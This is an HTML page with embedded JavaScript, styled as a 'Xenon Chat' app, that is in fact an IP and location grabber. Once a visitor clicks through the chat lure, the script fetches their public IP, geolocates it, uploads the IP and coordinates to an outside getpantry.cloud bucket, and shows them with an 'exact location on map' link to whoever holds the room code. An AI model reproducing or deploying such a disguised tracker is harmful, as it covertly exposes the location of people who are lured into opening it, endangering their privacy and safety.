<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xenon Chat</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #0f0;
            font-family: monospace;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        #landing {
            position: absolute;
            inset: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        #main {
            position: absolute;
            inset: 0;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        #ip-page {
            position: absolute;
            inset: 0;
            background: #000;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }
        #setup, #ip-page, #landing {
            transition: opacity 0.6s ease;
        }
        button.big {
            background: #111;
            color: #0f0;
            border: 2px solid #0f0;
            padding: 20px 40px;
            font-size: 2rem;
            font-family: monospace;
            margin: 40px 20px;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s;
        }
        button.big:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 30px #0f08;
        }
        input {
            background: #111;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 15px 25px;
            font-size: 1.5rem;
            font-family: monospace;
            margin: 20px;
            width: 320px;
            text-align: center;
        }
        #ip-display { font-size: 2.4rem; margin: 20px 0; word-break: break-all; max-width: 95%; letter-spacing: 2px; }
        #geo { font-size: 1.6rem; color: #0f8; margin: 15px 0; min-height: 3.2rem; text-align: center; }
        #maplink { font-size: 1.4rem; color: #0ff; margin: 30px 0; text-decoration: none; border-bottom: 1px dashed #0ff; }
        #maplink:hover { background: #0ff3; }
        #status { font-size: 1.1rem; color: #555; margin-top: 40px; text-align: center; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <!-- Initial landing page with big button -->
    <div id="landing">
        <div style="font-size: 3.5rem; margin-bottom: 40px; letter-spacing: 6px;">XENON CHAT</div>
        <button class="big" onclick="enterChat()">GO INTO XENON CHAT</button>
    </div>

    <!-- Setup: enter room code (shows after clicking the button) -->
    <div id="setup" class="hidden">
        <div style="font-size: 2rem; margin-bottom: 30px;">Enter shared room code</div>
        <input id="room-input" placeholder="e.g. xenon42" maxlength="12" autocomplete="off">
        <button class="big" onclick="startWithRoom()">CONNECT</button>
        <div id="setup-status" style="color:#f55; margin-top:30px; font-size:1.2rem;"></div>
    </div>

    <!-- Main blank capture page -->
    <div id="main" class="hidden">
        <div style="font-size:1.2rem; opacity:0.4;">capturing & syncing to <span id="room-show"></span>...</div>
        <button class="big" style="margin-top:60px; font-size:1.6rem; padding:15px 30px;" onclick="goToIp()">VIEW SHARED DATA →</button>
    </div>

    <!-- /ip view page -->
    <div id="ip-page" class="hidden">
        <div style="font-size:1.8rem; margin-bottom:20px;">Room: <span id="room-display"></span></div>
        <div id="ip-display">—</div>
        <div id="geo">—</div>
        <a id="maplink" href="#" target="_blank" style="display:none;">→ exact location on map</a>
        <div id="status" style="margin-top:50px;">fetching live data...</div>
        <button class="big" style="margin-top:60px; font-size:1.6rem; padding:15px 30px;" onclick="goToMain()">BACK</button>
    </div>

    <script>
        const PANTRY_BASE = "https://getpantry.cloud/apiv1/pantry/";
        let ROOM = localStorage.getItem("xenon_room") || "";
        const REFRESH_MS = 8000;

        function enterChat() {
            document.getElementById("landing").classList.add("hidden");
            if (ROOM) {
                // Already have room → go straight to main capture
                document.getElementById("main").classList.remove("hidden");
                document.getElementById("room-show").textContent = ROOM;
                captureAndUpload();
            } else {
                // First time → show room setup
                document.getElementById("setup").classList.remove("hidden");
            }
        }

        function startWithRoom() {
            const input = document.getElementById("room-input").value.trim().toLowerCase();
            if (!input || input.length < 4) {
                document.getElementById("setup-status").textContent = "use at least 4 characters";
                return;
            }
            ROOM = input;
            localStorage.setItem("xenon_room", ROOM);
            document.getElementById("setup").classList.add("hidden");
            document.getElementById("main").classList.remove("hidden");
            document.getElementById("room-show").textContent = ROOM;
            captureAndUpload();
        }

        async function captureAndUpload() {
            try {
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const { ip } = await ipRes.json();

                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                const geo = await geoRes.json();

                if (!geo.error) {
                    const geoData = {
                        lat: geo.latitude,
                        lon: geo.longitude,
                        city: geo.city || geo.region || "?",
                        country: geo.country_name || "?"
                    };
                    await fetch(PANTRY_BASE + ROOM, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ ip, geo: geoData })
                    });
                }
            } catch (e) {}
        }

        async function fetchShared() {
            if (!ROOM) return null;
            try {
                const res = await fetch(PANTRY_BASE + ROOM);
                if (!res.ok) return null;
                return await res.json();
            } catch (e) {
                return null;
            }
        }

        function updateIpDisplay(data) {
            const ipEl    = document.getElementById("ip-display");
            const geoEl   = document.getElementById("geo");
            const mapEl   = document.getElementById("maplink");
            const status  = document.getElementById("status");

            if (!data || !data.ip) {
                ipEl.textContent = "—";
                geoEl.textContent = "no data in room yet";
                mapEl.style.display = "none";
                status.textContent = "waiting for capture...";
                return;
            }

            ipEl.textContent = data.ip;
            const g = data.geo || {};
            geoEl.innerHTML = `${g.city || "?"} • ${g.country || "?"}<br>${(g.lat||0).toFixed(6)}, ${(g.lon||0).toFixed(6)}`;

            if (g.lat && g.lon) {
                mapEl.href = `https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=15/${g.lat}/${g.lon}`;
                mapEl.style.display = "inline-block";
            } else {
                mapEl.style.display = "none";
            }

            status.textContent = `live • room: ${ROOM} • auto-refresh every ${REFRESH_MS/1000}s`;
        }

        async function liveRefresh() {
            const data = await fetchShared();
            updateIpDisplay(data);
        }

        function goToIp() {
            document.getElementById("main").classList.add("hidden");
            document.getElementById("ip-page").classList.remove("hidden");
            document.getElementById("room-display").textContent = ROOM;
            liveRefresh();
            const interval = setInterval(liveRefresh, REFRESH_MS);
            // Cleanup on leave
            const cleanup = () => clearInterval(interval);
            window.addEventListener("hashchange", cleanup, {once: true});
            // Also stop if going back via button
            document.querySelector("#ip-page button").onclick = () => {
                cleanup();
                goToMain();
            };
        }

        function goToMain() {
            document.getElementById("ip-page").classList.add("hidden");
            document.getElementById("main").classList.remove("hidden");
            captureAndUpload(); // refresh capture when returning
        }

        // If reloaded with #ip → go directly there (optional)
        if (location.hash === "#ip" && ROOM) {
            enterChat();
            setTimeout(goToIp, 500);
        }
    </script>
</body>
</html>
